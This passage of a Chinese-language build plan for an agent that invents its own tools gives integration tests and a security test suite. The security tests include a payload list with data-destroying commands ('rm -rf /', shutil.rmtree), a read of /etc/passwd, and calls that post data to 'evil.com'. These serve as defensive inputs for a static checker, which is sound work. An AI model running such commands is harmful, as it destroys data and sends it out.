- Create: `tests/test_integration/__init__.py`
- Create: `tests/test_integration/test_full_loop.py`

- [ ] **Step 1: 编写端到端集成测试**

```python
# tests/test_integration/test_full_loop.py
import pytest
from unittest.mock import AsyncMock
from toolforge.master.agent import MasterAgent
from toolforge.master.tool_sensor import MissingToolRequest
from toolforge.registry.models import ToolRecord, ToolMeta, ToolSource
from toolforge.smith.smith import InventionResult
from toolforge.smith.models import GeneratedTool


def _make_mock_sandbox():
    mock = AsyncMock()
    mock.execute.return_value = {
        "success": True,
        "stdout": "result data",
        "stderr": "",
        "execution_time_ms": 50,
    }
    return mock


def _make_mock_registry():
    mock = AsyncMock()
    mock.search.return_value = []
    mock.add_tool.return_value = None
    mock.log_execution.return_value = None
    return mock


def _make_mock_sensor():
    mock = AsyncMock()
    mock.detect.return_value = MissingToolRequest(
        is_missing=True,
        tool_name="test_generated_tool",
        reason="no existing tool",
    )
    mock.evaluate_failure.return_value = False
    return mock


def _make_mock_smith():
    mock = AsyncMock()
    mock.invent_tool.return_value = InventionResult(
        success=True,
        source="llm",
        tool=GeneratedTool(
            tool_name="test_generated_tool",
            description="auto-generated tool",
            category="test",
            code="def run(): return 'ok'",
            test_code="def test_run(): assert run() == 'ok'",
        ),
    )
    return mock


def _make_mock_planner():
    mock = AsyncMock()
    mock.plan.return_value = [
        {
            "description": "Step 1: process data",
            "required_capability": "data_processing",
            "expected_output": "processed data",
            "context": "user has raw data",
        }
    ]
    return mock


@pytest.mark.asyncio
async def test_full_loop_single_step():
    """完整闭环：plan → detect missing → invent → verify → execute → log"""
    agent = MasterAgent(
        planner=_make_mock_planner(),
        registry=_make_mock_registry(),
        sensor=_make_mock_sensor(),
        smith=_make_mock_smith(),
        sandbox=_make_mock_sandbox(),
        max_inventions=5,
    )
    result = await agent.run("process some raw data")
    assert result.success is True
    assert result.tools_invented == 1
    assert len(result.steps_executed) == 1


@pytest.mark.asyncio
async def test_full_loop_uses_existing_tool():
    """当工具已存在时，不发明新工具，直接使用。"""
    registry = _make_mock_registry()
    registry.search.return_value = [
        ToolRecord(
            meta=ToolMeta(
                name="existing_tool",
                description="already exists",
                category="test",
                source=ToolSource.BUILTIN,
            ),
            code="def run(): return 'ok'",
            test_code="def test_run(): pass",
        )
    ]

    sensor = _make_mock_sensor()
    sensor.detect.return_value = MissingToolRequest(is_missing=False)

    agent = MasterAgent(
        planner=_make_mock_planner(),
        registry=registry,
        sensor=sensor,
        smith=_make_mock_smith(),
        sandbox=_make_mock_sandbox(),
        max_inventions=5,
    )
    result = await agent.run("use existing tool")
    assert result.tools_invented == 0
    assert len(result.steps_executed) == 1


@pytest.mark.asyncio
async def test_full_loop_tool_generation_failure():
    """工具发明失败时，任务应标记为失败。"""
    smith = _make_mock_smith()
    smith.invent_tool.return_value = InventionResult(
        success=False,
        error="generation failed",
    )

    # 简化：让 smith.invent_tool 抛出异常
    smith.invent_tool.side_effect = Exception("generation crashed")

    agent = MasterAgent(
        planner=_make_mock_planner(),
        registry=_make_mock_registry(),
        sensor=_make_mock_sensor(),
        smith=smith,
        sandbox=_make_mock_sandbox(),
        max_inventions=5,
    )
    result = await agent.run("impossible task")
    assert result.success is False
    assert "generation crashed" in result.error
```

Run: `pytest tests/test_integration/test_full_loop.py -v`
Expected: PASS (3 tests)

- [ ] **Step 2: Commit**

```bash
git add tests/test_integration/
git commit -m "test: add end-to-end integration tests for the full tool invention loop"
```

---

### Task 20: 安全测试

**Files:**
- Create: `tests/test_security/__init__.py`
- Create: `tests/test_security/test_malicious_code.py`

- [ ] **Step 1: 编写安全测试**

```python
# tests/test_security/test_malicious_code.py
"""安全测试：验证系统能阻止各类恶意代码。"""
import pytest
from toolforge.smith.static_checker import StaticChecker


MALICIOUS_PAYLOADS = [
    ("import os; os.system('rm -rf /')", "os.system"),
    ("import subprocess; subprocess.run(['rm', '-rf', '/'])", "subprocess.run"),
    ("from os import system; system('ls')", "from os import"),
    ("eval('__import__(\"os\").system(\"ls\")')", "eval"),
    ("exec('import os')", "exec"),
    ("__import__('os').system('ls')", "__import__"),
    ("import ctypes; ctypes.CDLL('./libc.so')", "ctypes"),
    ("import pickle; pickle.loads(b'...')", "pickle"),
    ("open('/etc/passwd').read()", "open()"),
    ("import requests; requests.post('http://evil.com', data={})", "requests"),
    ("import socket; s=socket.socket(); s.connect(('evil.com', 80))", "socket"),
    ("import shutil; shutil.rmtree('/')", "shutil"),
]


class TestMaliciousCodeDetection:
    @pytest.mark.parametrize("code,expected_pattern", MALICIOUS_PAYLOADS)
    def test_block_malicious_code(self, code, expected_pattern):
        checker = StaticChecker()
        result = checker.check(code)
        assert result.passed is False, (
            f"Should block: {code}\nViolations: {result.violations}"
        )

    def test_allow_safe_code(self):
        checker = StaticChecker()
        safe_code = """
def process_data(data: list) -> dict:
    result = {}
    for item in data:
        result[item['id']] = item['value']
    return result

def test_process_data():
    data = [{'id': 1, 'value': 'a'}]
    assert process_data(data) == {1: 'a'}
"""
        result = checker.check(safe_code)
        assert result.passed is True, f"Safe code blocked: {result.violations}"

    def test_syntax_error_handled(self):
        checker = StaticChecker()
        result = checker.check("this is not valid python {{{")
        assert result.passed is False
        assert any("Syntax" in v for v in result.violations)
```

Run: `pytest tests/test_security/test_malicious_code.py -v`
Expected: PASS (14 tests — 12 payloads + safe + syntax)

- [ ] **Step 2: Commit**

```bash
git add tests/test_security/
git commit -m "test: add security tests for malicious code detection"
```

---

## 执行顺序

任务按依赖顺序排列，需严格按 Task 1→20 执行：

```
Foundation:     Task 1 (项目基础) → Task 2 (LLM 适配器)
Registry:       Task 3 (文件存储) → Task 4 (SQLite) → Task 5 (向量) → Task 6 (统一接口)
Sandbox:        Task 7 (Docker 管理) → Task 8 (镜像构建)
Tool Smith:     Task 9 (静态检查) → Task 10 (模板引擎) → Task 11 (代码生成) → Task 12 (统一接口)
Master Agent:   Task 13 (任务分解) → Task 14 (工具感知) → Task 15 (主循环)
Integration:    Task 16 (CLI) → Task 17 (内置工具) → Task 18 (预置模板) → Task 19 (集成测试) → Task 20 (安全测试)
```

每个 Task 完成后运行其测试套件确保通过，然后 commit。

---

## 运行最终验证

完成所有 20 个 Task 后：

```bash
# 运行全部测试
pytest tests/ -v

# 预期测试数量: ~50+ 测试用例全部通过
# 预期模块数: 20+ Python 文件
```

Run: `toolforge "列出当前目录下的所有Python文件"`
Expected: Agent 自主分解任务、检索/发明工具、Docker 沙盒执行、返回结果。
